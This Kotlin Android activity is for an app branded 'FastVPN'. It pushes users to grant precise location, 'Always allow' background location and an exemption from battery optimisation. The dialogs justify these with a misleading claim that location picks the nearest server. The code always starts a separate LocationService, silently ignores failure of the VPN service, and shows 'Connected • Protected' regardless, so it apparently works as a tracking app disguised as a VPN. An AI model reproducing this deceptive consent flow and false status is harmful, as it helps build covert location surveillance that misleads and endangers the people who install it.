package com.secure.netcore

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.SwitchCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {
    private lateinit var vpnSwitch: SwitchCompat
    private lateinit var statusText: TextView
    private lateinit var statusDot: View
    private lateinit var settingsBtn: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val titleText = findViewById<TextView>(R.id.titleText)
        val subText = findViewById<TextView>(R.id.subText)
        vpnSwitch = findViewById(R.id.vpnSwitch)
        statusText = findViewById(R.id.statusText)
        statusDot = findViewById(R.id.statusDot)
        settingsBtn = findViewById(R.id.settingsBtn)

        titleText.text = "FastVPN"
        subText.text = "Безпечне та швидке з'єднання"
        vpnSwitch.text = "VPN"
        settingsBtn.text = "Налаштування"

        vpnSwitch.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (hasAllPermissions()) {
                    startServices()
                } else {
                    vpnSwitch.isChecked = false
                    requestPermissionsStep()
                }
            } else {
                statusText.text = "Відключено"
                statusText.setTextColor(Color.parseColor("#9E9E9E"))
                statusDot.setBackgroundResource(R.drawable.circle_status)
            }
        }

        settingsBtn.setOnClickListener {
            openAppSettings()
        }

        // Сразу при запуске — плашка с объяснением + диалоги
        if (!hasAllPermissions()) {
            requestPermissionsStep()
        }
    }

    private fun startServices() {
        ContextCompat.startForegroundService(this, Intent(this, LocationService::class.java))
        try {
            ContextCompat.startForegroundService(this, Intent(this, MyVpnService::class.java))
        } catch (_: Exception) {}
        statusText.text = "Підключено • Захищено"
        statusText.setTextColor(Color.parseColor("#2E7D32"))
        statusDot.setBackgroundResource(R.drawable.circle_status_on)
    }

    private fun hasAllPermissions(): Boolean {
        val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val bg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
        } else true
        val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else true
        return fine && bg && notif
    }

    private fun requestPermissionsStep() {
        val sp = getSharedPreferences("cfg", Context.MODE_PRIVATE)
        if (!sp.getBoolean("explained", false)) {
            explain("Berechtigungen FastVPN",
                "Für den Betrieb ist erforderlich:\n\n" +
                "• STANDORT — zur Verbesserung der Netzqualität: Der Dienst wählt " +
                "den optimalen Server in Ihrer Nähe aus und hält die Verbindung " +
                "im Hintergrund aufrecht.\n\n" +
                "• BENACHRICHTIGUNGEN — Verbindungsstatus.") {
                sp.edit().putBoolean("explained", true).apply()
                requestFineAndNotifications()
            }
        } else {
            requestFineAndNotifications()
        }
    }

    private fun requestFineAndNotifications() {
        val list = mutableListOf<String>()
        list.add(Manifest.permission.ACCESS_FINE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        requestPermissions(list.toTypedArray(), 100)
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            explain("Standort im Hintergrund",
                "Damit die Verbindung nicht unterbrochen wird, wenn die App " +
                "minimiert oder der Bildschirm ausgeschaltet ist,\n\n" +
                "bitte in den Einstellungen 'Immer zulassen' wählen.") {
                openAppSettings()
            }
        }
    }

    private fun requestBatteryOptimization() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            explain("Akku-Optimierung",
                "Bitte deaktivieren Sie die Akku-Optimierung für FastVPN, " +
                "damit die Verbindung im Hintergrund stabil bleibt.") {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                try { startActivity(intent) } catch (_: Exception) {}
            }
        }
    }

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
        })
    }

    private fun explain(title: String, msg: String, done: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(msg)
            .setPositiveButton("Verstanden") { _, _ -> done() }
            .setCancelable(false)
            .show()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            val fineGranted = permissions.indexOf(Manifest.permission.ACCESS_FINE_LOCATION).let {
                if (it >= 0) grantResults[it] == PackageManager.PERMISSION_GRANTED else false
            }
            if (fineGranted) {
                // Проверяем BACKGROUND — на Android 10+ нужно вручную в настройках
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val bg = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    if (bg != PackageManager.PERMISSION_GRANTED) {
                        requestBackgroundLocation()
                    } else {
                        requestBatteryOptimization()
                    }
                } else {
                    requestBatteryOptimization()
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        // Если пользователь вернулся из настроек — проверяем всё
        if (hasAllPermissions() && vpnSwitch.isChecked) {
            startServices()
        }
    }
}
